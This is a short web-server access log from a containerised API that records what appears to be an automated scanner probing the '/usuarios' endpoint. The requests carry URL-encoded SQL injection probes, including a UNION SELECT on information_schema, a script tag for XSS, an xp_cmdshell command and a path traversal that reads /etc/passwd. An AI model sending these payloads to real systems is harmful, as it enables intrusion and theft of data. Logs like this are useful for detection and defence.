api-1  | INFO:     Started server process [1]
api-1  | INFO:     Waiting for application startup.
api-1  | INFO:     Application startup complete.
api-1  | INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
api-1  | INFO:     172.18.0.1:58266 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:58280 - "GET /usuarios?bAxj=4466%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:58290 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:58302 - "GET /1790 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58316 - "GET /usuarios%29%22%28%2C%2C%2C%29%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58332 - "GET /usuarios%27OJRJaR%3C%27%22%3EffJqAt HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58346 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:58348 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/1915%3D2874/%2A%2A/AND/%2A%2A/%289539%3D9539 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58364 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/4282%3D4282/%2A%2A/AND/%2A%2A/%281986%3D1986 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58376 - "GET /usuarios/%2A%2A/AND/%2A%2A/3160%3D6185 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58392 - "GET /usuarios/%2A%2A/AND/%2A%2A/4282%3D4282 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58394 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/1380%3D7027/%2A%2A/AND/%2A%2A/%28%27SsqY%27%3D%27SsqY HTTP/1.1" 404 Not Found
